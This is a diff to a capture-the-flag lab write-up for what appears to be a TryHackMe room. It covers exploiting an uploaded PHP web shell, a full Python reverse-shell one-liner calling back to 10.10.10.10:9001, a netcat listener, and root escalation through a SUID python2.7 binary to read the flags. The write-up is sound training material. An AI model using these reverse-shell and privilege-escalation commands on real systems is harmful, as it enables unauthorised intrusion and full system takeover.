@@ -80,7 +80,7 @@ Ok now its time to exploit it, at first set a netcat for listening
 Listening on 0.0.0.0 4444
 ```
 
-But how to exploit it 
+But how to exploit it,
 URL would look like that
 
 **http://XXX/uploads/rce.php5**
@@ -92,3 +92,56 @@ and in payload we use "'cmd'" so we can use it like web like a terminal
 and we can exploi it with other RCE writen in python
 
 **http://XXX/uploads/rce.php5?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'**
+
+---
+### First flag 
+
+first flag is pretty easy we just need to find user.txt file we can do it like that
+```
+find / -type f -name user.txt 2> /dev/null
+```
+
+```
+bash-5.0$ cat user.txt
+cat user.txt
+THM{XXX}
+```
+
+### Secound flag 
+
+That flag is root flag 
+
+with we can search file with SUID permissions
+```
+# find / -user root -perm /4000
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/bin/newuidmap
+/usr/bin/newgidmap
+/usr/bin/chsh
+/usr/bin/python2.7
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/pkexec
+```
+we can see that we can use Python 2.7
+i used https://gtfobins.github.io/gtfobins/python/#sudo to abuse it 
+```
+bash-5.0$ python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+cd /root
+cd /root
+ls
+ls
+root.txt  snap
+cat root.txt
+cat root.txt
+THM{XXX}
+```
